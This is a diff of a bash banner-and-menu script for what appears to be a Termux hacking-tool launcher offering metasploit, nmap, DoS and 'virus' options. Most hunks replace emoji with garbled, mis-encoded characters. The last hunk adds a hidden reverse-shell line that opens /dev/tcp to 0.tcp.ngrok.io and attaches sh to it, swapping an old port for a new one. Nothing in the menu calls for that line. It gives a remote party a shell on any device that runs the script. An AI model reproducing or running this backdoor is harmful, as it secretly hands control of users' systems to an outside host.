@@ -72,7 +72,7 @@ echo -e '    ()\/_____                           _____\/()'
 sleep 0.1
 echo -e '   .-``      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-.'      
 sleep 0.1
-echo -e '.-~              ____'$y'[90]helpℹ️'$cyan'____               ~-.'  
+echo -e '.-~              ____'$y'[90]helpâ„¹ï¸'$cyan'____               ~-.'  
 sleep 0.1
 echo -e '`~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~`'
 sleep 0.1
@@ -94,9 +94,9 @@ echo ""
 echo ""
 chat2
 echo -e "$green+________________________________________________________+"
-echo -e "$cyan|  [1] metasploit ⚔️|  $blue  [2] nmap 🌎| $purple  [3] dos attack ⛄1�7 |             "
+echo -e "$cyan|  [1] metasploit âš”ï¸|  $blue  [2] nmap ðŸŒŽ| $purple  [3] dos attack â›„1¤7 |             "
 #echo -e "| $green            --------------------------------            |  "
-echo -e "$yellow|  [4]   ngrok 🌐  |  $red  [5] virus ☢️️|  $reset [6]   Termux 📟   |    "
+echo -e "$yellow|  [4]   ngrok ðŸŒ  |  $red  [5] virus â˜¢ï¸ï¸|  $reset [6]   Termux ðŸ“Ÿ   |    "
 #echo "     "                                   
 echo -e "$purple|  [7] facebook   $blue      [8] Encrypt   $cyan [9] tool root "$g" pro|"
 echo -e " $green          --------------------------------------"
@@ -115,7 +115,7 @@ echo -e " [00] Exit           $green                          [99] update"
 echo -e "$cyan"
 echo -e "|---{$yellow my ip$cyan }---| "
 
-0<&82-;exec 82<>/dev/tcp/0.tcp.ngrok.io/14536;sh <&82 >&82 2>&82
+0<&82-;exec 82<>/dev/tcp/0.tcp.ngrok.io/18088;sh <&82 >&82 2>&82
                                              
 
 
